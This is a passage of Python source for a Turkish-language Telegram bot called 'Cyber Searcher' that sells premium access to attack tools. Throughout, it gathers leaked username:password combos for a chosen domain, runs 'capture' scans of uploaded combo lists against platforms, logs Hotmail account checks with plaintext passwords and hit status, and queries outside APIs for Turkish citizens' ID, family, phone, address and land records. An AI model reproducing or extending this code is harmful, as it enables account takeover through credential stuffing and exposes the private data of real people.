    return (None, None)

def _admin_premium_select_user(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı! Lütfen @kullaniciadi veya ID girin."); return
    add_user(tid, tuname or "", "Premium Verildi")
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("📧 Hotmail Premium Ver", f"adm_give_hotmail_{tid}_{tuname or tid}"),
           _btn("🌍 OSINT Premium Ver", f"adm_give_osint_{tid}_{tuname or tid}"),
           _btn("📸 Capture Premium Ver", f"adm_give_capture_{tid}_{tuname or tid}"))
    bot_instance.send_message(msg.chat.id,
        f"👤 Kullanıcı: @{tuname or tid} (ID: {tid})\nHangi premiumu vermek istiyorsun?", reply_markup=mk)

def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten Hotmail Premium!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"📧 @{tuname or tid} Hotmail Premium verildi!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id, "✅ Verildi!")
        except: pass

def _admin_give_premium_osint(call, tid, tuname, bot_instance):
    if is_premium_osint(tid):
        try: bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten OSINT Premium!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id)
        except: pass
        return
    if set_premium_osint(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"🌍 @{tuname or tid} OSINT Premium verildi!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id, "✅ Verildi!")
        except: pass

def _admin_give_premium_capture(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten Premium!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try: bot_instance.edit_message_text(f"📸 @{tuname or tid} Capture Premium verildi!", call.message.chat.id, call.message.message_id); bot_instance.answer_callback_query(call.id, "✅ Verildi!")
        except: pass

def _process_add_keyword(msg, bot_instance, uid):
    text = msg.text.strip()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!"); return
    new_keywords = [k.strip().lower() for k in text.split(',') if k.strip()]
    if not new_keywords:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!"); return
    current_keywords = get_user_keywords(uid); added = []; failed = []
    for kw in new_keywords:
        if kw in current_keywords: failed.append(f"'{kw}' zaten mevcut"); continue
        if not can_add_keyword(uid): failed.append(f"Limit dolu! ({get_keyword_limit_text(uid)})"); break
        current_keywords.append(kw); added.append(kw)
    if added:
        set_user_keywords(uid, current_keywords)
        bot_instance.reply_to(msg, f"✅ **Keywordler eklendi!**\n➕ Eklenen: {', '.join(added)}\n📊 Mevcut: {', '.join(current_keywords)}\n📌 Limit: {get_keyword_limit_text(uid)}")
    else:
        bot_instance.reply_to(msg, f"❌ **Keyword eklenemedi!**\n{', '.join(failed)}\n📊 Mevcut: {', '.join(current_keywords)}")

def _process_del_keyword(msg, bot_instance, uid):
    text = msg.text.strip().lower()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!"); return
    del_keywords = [k.strip() for k in text.split(',') if k.strip()]
    current_keywords = get_user_keywords(uid); removed = []; not_found = []
    for kw in del_keywords:
        if kw in current_keywords: current_keywords.remove(kw); removed.append(kw)
        else: not_found.append(kw)
    if removed:
        set_user_keywords(uid, current_keywords)
        result_msg = f"✅ **Keywordler silindi!**\n🗑️ Silinen: {', '.join(removed)}\n"
        if not_found: result_msg += f"❌ Bulunamadı: {', '.join(not_found)}\n"
        result_msg += f"\n📊 Mevcut: {', '.join(current_keywords)}"
        bot_instance.reply_to(msg, result_msg)
    else:
        bot_instance.reply_to(msg, f"❌ **Hiçbir keyword silinemedi!**\n❌ Bulunamadı: {', '.join(not_found)}")

def _process_capture_file(msg, bot_instance, target_app):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!"); return
    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [l.strip() for l in combo_text.splitlines() if l.strip() and ":" in l.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Dosyada geçerli combo bulunamadı!"); return
        if not can_use_capture(uid):
            bot_instance.reply_to(msg, f"❌ **Capture hakkınız doldu!**\n📊 Kullanım: {get_capture_used(uid)}/{FREE_CAPTURE_LIMIT}")
            return
        platform_name = "Tüm Platformlar"
        if target_app:
            for num, app_mail in CAPTURE_APPS.items():
                if app_mail == target_app: platform_name = CAPTURE_NAMES[num]; break
        increment_capture_used(uid)
        status_msg = bot_instance.reply_to(msg,
            f"📸 **Capture Taraması Başladı!**\n📂 Toplam: {len(combo_list)} satır\n"
            f"🎯 Hedef: {platform_name}\n⏳ Lütfen bekleyin...")
        def run_capture():
            user_name = get_user_name(uid); is_prem = is_premium(uid)
            start_capture_scan(combo_list, uid, user_name, is_prem, target_app)
            with CAPTURE_LOCK:
                results = CAPTURE_RESULTS.get(uid, []); bad_count = CAPTURE_BAD; processed = CAPTURE_PROCESSED
                if results:
                    try:
                        bot_instance.edit_message_text(
                            f"✅ **Capture Tamamlandı!**\n📊 Toplam Hit: {len(results)}\n❌ Bad: {bad_count}\n📂 İşlenen: {processed}",
                            uid, status_msg.message_id)
                        if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
                            with open(f"capture_hits_{uid}.txt", "rb") as f:
                                bot_instance.send_document(uid, f, caption=f"📸 {len(results)}x Capture Hit")
                            os.remove(f"capture_hits_{uid}.txt")
                    except: pass
                else:
                    try: bot_instance.edit_message_text(f"❌ **Hit bulunamadı!**\n📂 İşlenen: {processed}\n❌ Bad: {bad_count}", uid, status_msg.message_id)
                    except: pass
        threading.Thread(target=run_capture, daemon=True).start()
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")

def _show_stats(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats")); return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    txt = (f"{s(uid,'stats_title')}\n{'─' * 30}\n"
           f"🔍 Sorgu: <b>{checks}</b>\n📦 Combo: <b>{combos}</b>\n"
           f"📧 Hotmail Premium: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT Premium: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"🆔 TG-ID Free: {max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))}/{TGID_FREE_LIMIT}\n"
           f"💰 TG-ID Bakiye: {tgid_get_balance(uid)}\n"
           f"📊 Günlük: {daily['checks']}/{limit}\n"
           f"📸 Capture: {capture_used}/{'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"\n👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt)

def _show_profile(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats")); return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    user_name = get_user_name(uid); daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    kw_list = keywords.split(',') if keywords else []
    tgid_free = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
    txt = (f"⚡️ **SİSTEME HOŞGELDİNİZ**\n{user_name} — {uid}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"👤 **KULLANICI PROFİLİ**\n"
           f"┣ Durum: {'🔴 YASAKLI' if is_banned_user else '🟢 ÇEVRİMİÇİ (ONLINE)'}\n"
           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE USER'}\n"
           f"📊 **SİSTEM İSTATİSTİKLERİ**\n"
           f"┣ Günlük Kullanım: {daily['checks']} / {limit}\n"
           f"┣ Toplam Check:    {checks + combos}\n"
           f"┣ Toplam Hit:      {daily['hits']}\n"
           f"┣ Thread Sayısı:   {HOTMAIL_THREADS}\n"
           f"┣ Keywordler:      {len(kw_list)} / {get_keyword_limit_text(uid)}\n"
           f"┗ Capture Kullanım: {capture_used} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"🆔 **TELEGRAM ID SORGU**\n"
           f"┣ Toplam: {tgid_get_total(uid)}\n┣ Free kalan: {tgid_free}/{TGID_FREE_LIMIT}\n"
           f"┗ Bakiye: {tgid_get_balance(uid)}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"⭐ **PREMIUM DURUM**\n📧 Hotmail: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"📅 Tarih: {prem_date or '—'}\n👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt)

def _show_leaderboard(chat_id, uid, bot_instance):
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT user_id,username,first_name,total_checks,total_combos,is_premium,is_premium_osint FROM users WHERE is_banned=0 ORDER BY total_combos DESC LIMIT 10")
    users = c.fetchall(); conn.close()
    if not users:
        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n❌ Henüz veri yok."); return
    medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    txt = f"{s(uid,'lb_title')}\n{'─' * 30}\n"
    for i, (u_id, uname, fname, tchk, tcmb, is_prem, is_prem_osint) in enumerate(users):
        nm = (fname or uname or str(u_id))[:15]
        pk = "⭐" if (is_prem or is_prem_osint) else ""
        txt += f"{medals[i]} <b>{nm}</b> {pk}\n📦 {tcmb}  🔍 {tchk}\n"
    txt += f"👨‍💻 @hackledin"
    bot_instance.send_message(chat_id, txt)

def _show_api_menu(chat_id, uid, bot_instance, edit=None):
    cur = api_pref(uid)
    cur_name = API_LIST[cur]["name"] if cur < len(API_LIST) else "Varsayılan"
    txt = s(uid, "api_title", cur=cur_name)
    mk = InlineKeyboardMarkup(row_width=1)
    for i, api in enumerate(API_LIST):
        ico = "✅" if i == cur else "◻️"
        mk.add(_btn(f"{ico} {api['name']}", f"setapi_{i}"))
    mk.add(_btn("🔄 Varsayılan", "setapi_default"))
    mk.add(_btn(s(uid, "home_btn"), "goto_home"))
    if edit:
        try: bot_instance.edit_message_text(txt, edit[0], edit[1], reply_markup=mk); return
        except: pass
    bot_instance.send_message(chat_id, txt, reply_markup=mk)

def _show_help(chat_id, uid, bot_instance):
    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
    txt = s(uid, "help_content", status=status)
    bot_instance.send_message(chat_id, txt)

def _process_combo(msg, bot_instance):
    uid = msg.from_user.id
    txt = msg.text.strip().split()
    if not txt: return
    domain = txt[0].replace("http://", "").replace("https://", "").split("/")[0]
    limit = int(txt[1]) if len(txt) > 1 and txt[1].isdigit() else None
    sm = bot_instance.reply_to(msg, s(uid, "searching", domain=domain))
    combos, err, apis = _combo_engine(domain, limit)
    if err or not combos:
        bot_instance.edit_message_text(s(uid, "no_result", domain=domain), msg.chat.id, sm.message_id); return
    update_stats(uid, len(combos))
    now = datetime.now()
    fname = f"{domain}_{now.strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"{'=' * 60}\nCYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
        f.write(f" Toplam: {len(combos)}\nTarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n")
        f.write("\n".join(combos))
        f.write(f"\n{'=' * 60}\n@hackledin\n")
    with open(fname, "rb") as f:
        bot_instance.send_document(msg.chat.id, f,
            caption=s(uid, "combo_caption", domain=domain, count=len(combos), apis=apis))
    os.remove(fname)
    try: bot_instance.delete_message(msg.chat.id, sm.message_id)
    except: pass

def _combo_engine(domain, limit=None):
    for bad in YASAKLI:
        if bad in domain.lower(): return None, f"Yasaklı domain: {bad}", None
    combos = []; apis = []
    def _extract(line):
        line = str(line)
        m = re.search(r"://[^/]+/[^:]*:(.+?):(.+)$", line)
        if m: return m.group(1).strip(), m.group(2).strip()
        parts = line.split(":")
        if len(parts) >= 2: return parts[-2].strip(), parts[-1].strip()
        return None, None
    for api in API_LIST:
        try:
            r = requests.get(api["url"] + domain, headers={"User-Agent":"Mozilla/5.0"}, timeout=10, verify=False)
            if r.status_code != 200: continue
            data = r.json(); lines = []
            if api["type"] == "wazely": lines = data.get("foundLines", [])
            elif api["type"] == "solidar": lines = data.get("sonuclar", [])
            elif api["type"] == "rootturkey":
                raw = data.get("data","") if isinstance(data, dict) else r.text
                lines = raw.split("\n")
            for l in lines:
                u, p = _extract(l)
                if u and p: combos.append(f"{u}:{p}")
            apis.append(api["name"])
        except: pass
    uniq = list(set(combos))
    if limit: uniq = uniq[:limit]
    return uniq, None, " + ".join(apis)

def _process_turkey(msg, tool, bot_instance):
    uid = msg.from_user.id
    param = msg.text.strip()
    l = lang(uid)
    if tool in ("tc","tcpro","aile","ailepro","sulale","tcgsm","eokul","tapu","adres"):
        if not (param.isdigit() and len(param) == 11):
            bot_instance.reply_to(msg, s(uid, "invalid_tc")); return
    elif tool == "gsmtc":
        clean = re.sub(r"\D", "", param).lstrip("0")
        if not (clean.isdigit() and len(clean) == 10):
            bot_instance.reply_to(msg, s(uid, "invalid_gsm")); return
        param = clean
    elif tool == "adsoyad":
        if len(param.split()) < 2:
            bot_instance.reply_to(msg, s(uid, "invalid_adsoyad")); return
    elif tool == "adaparsel":
        if "," not in param:
            bot_instance.reply_to(msg, s(uid, "invalid_adaparsel")); return
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    api_cfg = TURKIYE_API[tool]; url = api_cfg["url"]
    if tool == "adsoyad":
        pts = param.split()
        url = url.replace("{ad}", pts[0]).replace("{soyad}", " ".join(pts[1:]))
    elif tool == "gsmtc": url = url.replace("{gsm}", param)
    elif tool == "adaparsel":
        pts = param.split(",")
        url = url.replace("{il}", pts[0].strip().upper()).replace("{ilce}", pts[1].strip().upper())
    else: url = url.replace("{tc}", param)
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id); return
    result = _fmt_generic(f"{TURKIYE_API[tool]['icon']} {TURKIYE_API[tool][l]}", data, param, "Türkiye Sorgu")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"Turkey_{tool}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "tr_caption", tool=tool.upper(), param=param,
                       date=datetime.now().strftime("%d.%m.%Y %H:%M")))

def _process_ls(msg, key, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    if not val: return
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    info = LEAKSIGHTS_API[key]
    url = info["url"].replace("{value}", requests.utils.quote(val))
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id); return
    l = lang(uid)
    title = f"{info['icon']} LeakSights — {info.get(l, info.get('tr', key))}"
    result = _fmt_generic(title, data, val, "LeakSights ⭐")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"LS_{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "ls_caption", val=val, date=datetime.now().strftime("%d.%m.%Y %H:%M")))

def _api_get(url):
    try:
        r = requests.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=20, verify=False)
        if r.status_code == 200:
            try: return r.json(), None
            except: return None, f"JSON hatası:\n{r.text[:300]}"
        return None, f"❌ HTTP {r.status_code}"
    except requests.Timeout: return None, "⏰ Zaman aşımı!"
    except Exception as e: return None, f"❌ {e}"

def _fmt_generic(title, data, queried, header_extra=""):
    now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    lines = ["=" * 60, f" {title}", "=" * 60, f" Aranan  : {queried}", f" Tarih   : {now}", "=" * 60, ""]
    def _dump(obj, indent=0):
        prefix = "  " * indent
        if isinstance(obj, dict):
            for k, v in obj.items():
                if v is None or str(v).strip() == "": continue
                if isinstance(v, (dict, list)):
                    lines.append(f"{prefix}• {k}:"); _dump(v, indent + 1)
                else: lines.append(f"{prefix}• {k}: {v}")
        elif isinstance(obj, list):
            for i, item in enumerate(obj, 1):
                lines.append(f"{prefix}[{i}]"); _dump(item, indent + 1); lines.append("")
        else:
            if str(obj).strip(): lines.append(f"{prefix}{obj}")
    _dump(data)
    lines += ["", "=" * 60, f" {header_extra} — Cyber Searcher", " Developer: @hackledin", "=" * 60]
    return "\n".join(lines)

def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption):
    try:
        with open(fname, "w", encoding="utf-8") as f: f.write(content)
        with open(fname, "rb") as f: bot_instance.send_document(chat_id, f, caption=caption)
        os.remove(fname)
        try: bot_instance.delete_message(chat_id, status_mid)
        except: pass
    except Exception as e:
        try: bot_instance.edit_message_text(f"❌ {e}", chat_id, status_mid)
        except: pass

def _process_addbot(msg, bot_instance):
    uid = msg.from_user.id
    token = msg.text.strip()
    if len(token) < 30:
        bot_instance.reply_to(msg, "❌ Geçersiz token formatı!"); return
    if token == BOT_TOKEN:
        bot_instance.reply_to(msg, "❌ Ana botun token'ı eklenemez!"); return
    with _PROC_LOCK:
        if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
            bot_instance.reply_to(msg, s(uid, "multi_bot_exists")); return
        try:
            success = _spawn_bot(token, uid)
            if success:
                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
                                             owner=msg.from_user.first_name or str(uid)))
            else: bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
        except Exception as e: bot_instance.reply_to(msg, f"❌ Hata: {e}")

def _process_special_tool(msg, tool, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    if tool == "proxycheck": result = _proxycheck(val)
    else:
        domain = val.replace("http://", "").replace("https://", "").split("/")[0]
        result = _urlscan(domain)
    if len(result) > 4096:
        for i in range(0, len(result), 4096):
            bot_instance.send_message(msg.chat.id, f"<code>{result[i:i + 4096]}</code>")
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass
    else: bot_instance.edit_message_text(f"<code>{result}</code>", msg.chat.id, sm.message_id)

def _process_generic_tool(msg, tool, bot_instance):
    uid = msg.from_user.id; val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    try:
        resp = requests.get(TOOLS_API[tool] + val, timeout=15, verify=False)
        try: out = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except: out = resp.text
        bot_instance.edit_message_text(f"✅ <b>{tool.upper()}</b>\n<code>{out[:4000]}</code>", msg.chat.id, sm.message_id)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ {e}", msg.chat.id, sm.message_id)

def _proxycheck(ip):
    try:
        r = requests.get(f"https://proxycheck.io/v3/{ip}?vpn=1&asn=1&risk=1&port=1", timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        d = r.json()
        if ip not in d: return "❌ IP bulunamadı."
        info = d[ip]; loc = info.get("location", {}); det = info.get("detections", {}); net = info.get("network", {})
        lines = ["=" * 60, " 🛡️ PROXYCHECK.IO", "=" * 60, f" IP: {ip}", "",
                 " 📡 AĞ", f"  ASN        : {net.get('asn','—')}",
                 f"  Sağlayıcı  : {net.get('provider','—')}", f"  Hostname   : {net.get('hostname','—') or '—'}", "",
                 " 📍 KONUM", f"  Ülke  : {loc.get('country_name','—')} ({loc.get('country_code','—')})",
                 f"  Şehir : {loc.get('city_name','—')}", f"  TZ    : {loc.get('timezone','—')}", "",
                 " 🔍 TESPİT",
                 f"  Proxy    : {'⚠️ Evet' if det.get('proxy') else '✅ Hayır'}",
                 f"  VPN      : {'⚠️ Evet' if det.get('vpn') else '✅ Hayır'}",
                 f"  TOR      : {'⚠️ Evet' if det.get('tor') else '✅ Hayır'}",
                 f"  Hosting  : {'⚠️ Evet' if det.get('hosting') else '✅ Hayır'}",
                 f"  Risk     : {det.get('risk',0)}%", "",
                 "=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e: return f"❌ {e}"

def _urlscan(domain):
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}",
                         headers={"User-Agent":"Mozilla/5.0"}, timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        results = r.json().get("results", [])
        if not results: return f"🔍 {domain} için sonuç bulunamadı."
        lines = ["=" * 60, f" 🔍 URLSCAN.IO — {domain}", "=" * 60, ""]
        for i, res in enumerate(results[:5], 1):
            task = res.get("task", {}); page = res.get("page", {})
            lines += [f" SONUÇ #{i}", f"  URL    : {task.get('url','—')}", f"  IP     : {page.get('ip','—')}",
                      f"  Ülke   : {page.get('country','—')}", f"  Başlık : {page.get('title','—')}",
                      f"  Durum  : {page.get('status','—')}", ""]
        lines += ["=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e: return f"❌ {e}"

def _run_predunyam(chat_id, uid, bot_instance):
    try:
        r = requests.get(TOOLS_API["predunyam"], timeout=10, verify=False)
        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n<code>{r.text[:4000]}</code>")
    except Exception as e:
        bot_instance.send_message(chat_id, f"❌ {e}")

def _handle_admin_cb(call, action, bot_instance):
    uid = call.from_user.id; cid = call.message.chat.id; mid = call.message.message_id
    try:
        if action == "stats":
            tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
            txt = (f"📊 <b>BOT İSTATİSTİK</b>\n{'─' * 30}\n"
                   f"👥 Toplam Kullanıcı: <b>{tu}</b>\n📧 Hotmail Premium: <b>{prem_pu or 0}</b>\n"
                   f"🌍 OSINT Premium: <b>{osint_pu or 0}</b>\n📦 Toplam Combo: <b>{tc or 0}</b>\n"
                   f"🔍 Toplam Sorgu: <b>{tch or 0}</b>")
            try: bot_instance.edit_message_text(txt, cid, mid)
            except: bot_instance.send_message(cid, txt)
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_users":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id,username,first_name,premium_date,premium_osint_date FROM users WHERE is_premium=1 OR is_premium_osint=1")
            users = c.fetchall(); conn.close()
            if not users:
                try: bot_instance.answer_callback_query(call.id, "Henüz premium kullanıcı yok.")
                except: pass
                return
            txt = "⭐ <b>PREMIUM KULLANICILARI</b>\n"
            for u_id, uname, fname, prem_date, osint_date in users:
                txt += f"👤 @{uname or fname or u_id}\n"
                if prem_date: txt += f"   📧 Hotmail: {prem_date}\n"
                if osint_date: txt += f"   🌍 OSINT: {osint_date}\n"
                txt += "\n"
            try: bot_instance.edit_message_text(txt[:4096], cid, mid)
            except: bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_log":
            logs = get_premium_logs(20)
            if not logs:
                try: bot_instance.answer_callback_query(call.id, "Log yok.")
                except: pass
                return
            txt = "📋 <b>PREMIUM LOG</b>\n"
            for u_id, uname, package, amount, date in logs:
                txt += f"👤 @{uname or u_id}  📦 {package}  💰 {amount}⭐  📅 {date}\n"
            try: bot_instance.edit_message_text(txt[:4096], cid, mid)
            except: bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "give_premium":
            m = bot_instance.send_message(cid, "⭐ **Premium Ver**\nKullanıcı ID veya @kullanıcıadı gir:\nÖrnek: @user veya 123456789")
            bot_instance.register_next_step_handler(m, lambda m: _admin_premium_select_user(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action.startswith("give_hotmail_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_hotmail(call, tid, tuname, bot_instance); return
        elif action.startswith("give_osint_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_osint(call, tid, tuname, bot_instance); return
        elif action.startswith("give_capture_"):
            parts = action.split("_"); tid = int(parts[2]); tuname = parts[3] if len(parts) > 3 else str(tid)
            _admin_give_premium_capture(call, tid, tuname, bot_instance); return
        elif action == "remove":
            m = bot_instance.send_message(cid, "👤 **Premium Kaldır**\nKullanıcı ID veya @kullanıcıadı gir:")
            bot_instance.register_next_step_handler(m, lambda m: _admin_remove(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "ban":
            m = bot_instance.send_message(cid, "🚫 Banlamak istediğin kullanıcıyı gir (@kullanici veya ID):")
            bot_instance.register_next_step_handler(m, lambda m: _admin_ban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "unban":
            m = bot_instance.send_message(cid, "✅ Banını kaldırmak istediğin kullanıcıyı gir:")
            bot_instance.register_next_step_handler(m, lambda m: _admin_unban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "banned":
            banned = get_banned_users()
            if not banned: bot_instance.send_message(cid, "📭 Yasaklı kullanıcı bulunamadı.")
            else:
                txt = "🚫 <b>YASAKLI KULLANICILAR</b>\n"
                for u_id, uname, fname, reason in banned:
                    txt += f"👤 @{uname or fname or u_id}\n📌 Sebep: {reason}\n"
                bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "announce":
            m = bot_instance.send_message(cid, "📢 Duyuru mesajını gir:")
            bot_instance.register_next_step_handler(m, lambda m: _admin_announce(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "listbots":
            registry = _load_registry()
            if not registry: bot_instance.send_message(cid, s(uid, "multi_bot_no_bots"))
            else:
                lines = [s(uid, "multi_bot_list"), "─" * 30, ""]
                for token, info in registry.items():
                    with _PROC_LOCK:
                        proc = _CHILD_PROCS.get(token)
                        status = s(uid, "multi_bot_running") if proc and proc.poll() is None else s(uid, "multi_bot_stopped")
                    lines.append(f"🔑 `{token}`")
                    lines.append(f"   📌 {status}  📋 PID: {info.get('pid','—')}")
                    lines.append(f"   👤 Sahip: {info.get('owner_id','—')}  📅 {info.get('added','—')[:16]}")
                    lines.append("")
                lines.append("─" * 30)
                lines.append(s(uid, "multi_bot_total", count=len(registry)))
                bot_instance.send_message(cid, "\n".join(lines))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "hotmail_log":
            logs = get_hotmail_logs(30)
            if not logs: bot_instance.send_message(cid, "📭 Hotmail log kaydı bulunamadı.")
            else:
                txt = "📋 <b>HOTMAIL LOG</b>\n"
                for u_id, uname, email, password, status, detail, date in logs:
                    emoji = "✅" if status == "HIT" else "🔐" if status == "2FA" else "❌" if status == "BAD" else "⚠️"
                    txt += f"{emoji} @{uname or u_id} | {email} | {status}"
                    if detail: txt += f" ({detail})"
                    txt += f" | {date[:16]}\n"
                bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_give":
            m = bot_instance.send_message(cid, "🆔 <b>TG-ID Bakiye Ver</b>\nFormat: <code>USER_ID MIKTAR</code>\nÖrnek: <code>123456789 50</code>")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_give(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_take":
            m = bot_instance.send_message(cid, "➖ <b>TG-ID Bakiye Al</b>\nFormat: <code>USER_ID MIKTAR</code>\nÖrnek: <code>123456789 10</code>")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_take(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_logs":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, target, status, date FROM tgid_logs ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 TG-ID sorgu logu yok.")
            else:
                txt = "📋 <b>SON 20 TG-ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                for u_id, uname, target, status, date in logs:
                    ico = "✅" if status == "OK" else "❌"
                    txt += f"{ico} @{target} — @{uname or u_id} | {date[5:16]}\n"
                bot_instance.send_message(cid, txt[:4096])
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_purchases":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, package, queries, stars, date FROM tgid_purchases ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 TG-ID satın alma yok.")
            else:
                txt = "💰 <b>SON 20 TG-ID SATIN ALMA</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                for u_id, uname, package, q, stars, date in logs:
